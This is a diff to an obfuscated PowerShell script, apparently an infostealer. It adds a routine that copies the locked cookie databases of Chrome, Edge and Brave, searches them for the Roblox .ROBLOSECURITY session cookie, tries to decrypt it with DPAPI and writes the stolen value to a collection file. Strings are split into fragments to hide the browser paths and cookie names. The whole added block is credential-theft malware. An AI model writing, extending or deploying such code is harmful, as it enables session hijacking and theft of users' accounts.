@@ -178,3 +178,44 @@ foreach($b2 in $browsers){
     }catch{Add-Content $f0 "$tP|$($b2.N0)|READ_ERROR||"}
     Remove-Item $tmp -Force -EA SilentlyContinue
 }
+
+# === Browser Roblox cookies (Chrome/Edge/Brave) ===
+$tRB="R"+"OBLO"+"XWEB"
+$brProfiles=@(
+  @("$env:LOCALAPPDATA\Go"+"ogle\Ch"+"rome\User Data","Ch"+"rome"),
+  @("$env:LOCALAPPDATA\Micr"+"osoft\E"+"dge\User Data","Ed"+"ge"),
+  @("$env:LOCALAPPDATA\Bra"+"veSoft"+"ware\Brave-Browser\User Data","Br"+"ave")
+)
+foreach($bp in $brProfiles){
+  $cookiePath=Join-Path $bp[0] ("Def"+"ault\Co"+"okies")
+  if(!(Test-Path $cookiePath)){$cookiePath=Join-Path $bp[0] ("Co"+"okies")}
+  if(!(Test-Path $cookiePath)){continue}
+  $tmpCook=Join-Path $env:TEMP ("ck_$([Guid]::NewGuid()).d"+"b")
+  try{
+    $fs=[IO.File]::Open($cookiePath,[IO.FileMode]::Open,[IO.FileAccess]::Read,[IO.FileShare]::ReadWrite)
+    $ms=New-Object IO.MemoryStream;$fs.CopyTo($ms);$fs.Close()
+    [IO.File]::WriteAllBytes($tmpCook,$ms.ToArray());$ms.Close()
+    $rawCook=[IO.File]::ReadAllText($tmpCook,[Text.Encoding]::ASCII)
+    # Search for .ROBLOSECURITY in the raw SQLite data
+    $pattern=[char]46+'R'+'O'+'B'+'L'+'O'+'S'+'E'+'C'+'U'+'R'+'I'+'T'+'Y'
+    if($rawCook -match $pattern){
+      # Find the encrypted blob near the cookie name
+      $idx=$rawCook.IndexOf($pattern)
+      if($idx -gt 0){
+        $chunk=$rawCook.Substring([Math]::Max(0,$idx-50),[Math]::Min(200,$rawCook.Length-$idx+50))
+        # Try to find and decrypt DPAPI blob — look for v10/v11 prefix
+        if($chunk -match 'v1[01]([\x00-\xFF]{32,200})'){
+          try{
+            $encBytes=[Text.Encoding]::ASCII.GetBytes($Matches[1])
+            $decBytes=[Security.Cryptography.ProtectedData]::Unprotect($encBytes,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser)
+            $decVal=[Text.Encoding]::UTF8.GetString($decBytes).TrimEnd([char]0)
+            if($decVal.Length -gt 20){
+              Add-Content $f0 "$tRB|$($bp[1])|$decVal"
+            }
+          }catch{}
+        }
+      }
+    }
+  }catch{}
+  Remove-Item $tmpCook -Force -EA SilentlyContinue
+}
